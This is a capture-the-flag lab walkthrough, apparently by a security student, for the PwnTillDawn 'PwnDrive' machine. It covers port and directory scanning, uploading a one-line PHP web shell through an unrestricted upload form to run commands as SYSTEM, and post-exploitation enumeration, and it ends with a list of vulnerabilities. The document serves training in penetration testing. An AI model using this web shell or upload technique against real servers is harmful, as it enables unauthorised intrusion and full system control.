# 🛡️ PwnTillDawn - PwnDrive Walkthrough

## 📌 Overview
This walkthrough documents the exploitation of the **PwnDrive** machine from PwnTillDawn.  
The objective is to gain access via web vulnerabilities and enumerate the system.

---

## 🔍 Enumeration

### Nmap Scan
```bash
nmap -sC -sV <target-ip>
```

### 📸 Nmap Result
![Nmap Scan](images/nmap.png)

### Open Ports
- 21/tcp → FTP (Xlight FTPd 3.9)
- 80/tcp → HTTP (Apache 2.4.46, PHP 7.4.9)
- 135/tcp → MSRPC
- 139/tcp → NetBIOS
- 443/tcp → HTTPS
- 445/tcp → SMB
- 3306/tcp → MySQL (MariaDB)
- 1433/tcp → MSSQL

---

## 🌐 Web Enumeration

### Directory Brute Force
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

### 📸 Gobuster Result
![Gobuster](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/2f2d2dd10fa1dd6e9df2ce81d7d0ec0f18416878/pwntilldawn%205.png)

### Discovered Paths
- /admin
- /upload
- /components
- /inc
- /vendor

---

## 💥 Initial Access (RCE via File Upload)

### Upload PHP Shell
```php
<?php system($_GET['cmd']); ?>
```

### 📸 Upload Success
![Upload](images/upload_success.png)

### Access Shell
```
http://<target-ip>/upload/11/cmd.php?cmd=whoami
```

### 📸 RCE (whoami)
![whoami](images/whoami.png)

### Result
```
nt authority\system
```

🔥 The web server is running as SYSTEM → full control achieved

---

## 🖥️ Post Exploitation

### User Enumeration
```bash
net user
```

### 📸 Users
![Users](images/netuser.png)

---

### Directory Enumeration

#### Desktop Flag
```bash
dir C:\Users\Administrator\Desktop
```

### 📸 Flag Location
![Flag](images/flag.png)

---

#### Users Directory
```bash
dir C:\Users
```

### 📸 Users Folder
![Users Dir](images/users_dir.png)

---

## 📂 Web Application Access

### PwnDrive Dashboard
```
http://<target-ip>/myfiles.php
```

### 📸 Dashboard
![Dashboard](images/dashboard.png)

---

## 🔐 Admin Panel

### Access
```
http://<target-ip>/admin/
```

### 📸 Admin Panel
![Admin](images/admin_panel.png)

---

### Manage Users
![Manage Users](images/manage_users.png)

---

### Create User
![Create User](images/create_user.png)

---

## ⚠️ Vulnerabilities

- Unrestricted file upload → Remote Code Execution
- No input validation
- Exposed admin panel
- Weak access control
- Service running as SYSTEM (critical misconfiguration)

---

## 🏁 Flags

### User Flag
```
C:\Users\Administrator\Desktop\FLAG1.txt
```

---

## 🎯 Key Takeaways

- File upload features are critical attack vectors
- Always perform directory brute forcing
- Misconfigured services can give immediate SYSTEM access
- Post-exploitation enumeration is essential

---

## ⚙️ Tools Used

- Nmap
- Gobuster
- Browser
- PHP Web Shell

---

## 👨‍💻 Author

**Izzul Harith**  
Cybersecurity Student | Future Penetration Tester 🔥
